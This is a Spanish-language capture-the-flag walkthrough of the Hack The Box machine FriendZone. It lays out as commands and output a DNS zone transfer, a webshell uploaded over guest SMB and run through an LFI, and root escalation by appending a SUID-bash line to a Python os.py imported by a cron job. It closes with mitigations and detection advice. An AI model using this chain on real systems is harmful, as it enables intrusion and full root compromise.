---
machine: FriendZone
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, smb, lfi, cron, python-hijack]
---

# FriendZone — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

DNS con transferencia de zona abierta, SMB con invitado y un share escribible. La zona revela tres subdominios; el share `general` entrega credenciales de un panel con LFI en `pagename`, y `Development` se monta en `/etc/Development`, así que se sube una webshell por SMB y se incluye por el LFI. Dentro, `mysql_data.conf` da la contraseña de `friend`, y un cron de root que ejecuta un script Python cuyo `os.py` es escribible completa la escalada.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp   ftp    vsftpd 3.0.3 (anónimo denegado)
22/tcp   ssh    OpenSSH 7.6p1 Ubuntu 18.04
53/tcp   domain ISC BIND 9.11.3 (TCP abierto)
80/tcp   http   Apache 2.4.29
139/445  smb    Samba 4.7.6 (guest)
443/tcp  https  Apache (cert CN=friendzone.red)
```

```bash
echo "<IP> friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red" | sudo tee -a /etc/hosts
```

## Enumeración

```bash
dig axfr friendzone.red @<IP>
```

```text
administrator1.friendzone.red  A  127.0.0.1
hr.friendzone.red              A  127.0.0.1
uploads.friendzone.red         A  127.0.0.1
```

SMB:

```bash
smbmap -H <IP>
smbclient //<IP>/general -N
```

```text
general      READ
Development  READ,WRITE
```

En `general` hay `creds.txt`:

```text
creds for the admin THING:
admin:<password>
```

El comentario del share `Files` («/etc/Files») delata que los shares cuelgan de `/etc`; por analogía, `Development` es `/etc/Development`.

## Foothold

`https://administrator1.friendzone.red` tiene un login; con `admin:<password>` redirige a `dashboard.php`, que carga una página según `pagename` y añade `.php` automáticamente.

```bash
smbclient //<IP>/Development -N
smb: \> put shell.php
```

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La ruta se pasa sin `.php` porque la aplicación lo añade. Para una reverse shell hace falta la cookie de sesión del login, así que conviene autenticarse con `curl -c` y reutilizar el fichero con `-b`.

## Escalada

```bash
cat /var/www/mysql_data.conf
# db_user=friend
# db_pass=<password>
```

```bash
su friend
```

`friend` pertenece a `adm` y `lpadmin`, pero lo importante es lo que escribe:

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'
# /usr/lib/python2.7/os.py
```

```bash
cat /opt/server_admin/reporter.py
# #!/usr/bin/python
# import os
```

`pspy` confirma que root ejecuta `reporter.py` cada minuto. Como `import os` carga `/usr/lib/python2.7/os.py`, que es escribible, se añade una línea al final:

```bash
echo 'import os; os.system("chmod +s /bin/bash")' >> /usr/lib/python2.7/os.py
```

Se añade, no se reemplaza: el módulo debe seguir funcionando para que el cron no falle. Al minuto siguiente:

```bash
/bin/bash -p
```

## Evidencia

- `dig axfr` con los tres subdominios.
- `id` → `www-data`, `friend` y `root`.
- `ls -la /bin/bash` con SUID.

## Lecciones aprendidas

- Puerto 53 en TCP abierto invita a probar AXFR; una zona mal configurada entrega todo el mapa.
- Los comentarios de los shares de Samba filtran rutas del sistema (`/etc/Files`).
- LFI + share escribible = RCE, aunque el LFI sea «solo de lectura» en teoría.
- Un cron de root que importa un módulo escribible es escalada, sin tocar el script.
- Confirmar con `pspy` antes de modificar nada evita romper el sistema para nada.

## Mitigaciones y detección

- Restringir AXFR a servidores secundarios autorizados.
- Quitar acceso invitado a SMB y no publicar shares escribibles.
- Validar `pagename` contra una lista blanca y no concatenar `.php` a una ruta del usuario.
- Permisos 0755 y propietario root en la librería estándar de Python; auditar `find / -writable`.
- Cron de root solo sobre scripts y módulos no escribibles por terceros.
- Detección: consultas AXFR desde hosts no autorizados, escrituras en `/usr/lib/python*`, SUID nuevo.
- MITRE: T1590.002 (DNS), T1083, T1053.003.

## Referencias

- MITRE ATT&CK: T1590.002, T1053.003, T1548.001.
- Documentación de BIND sobre `allow-transfer`.
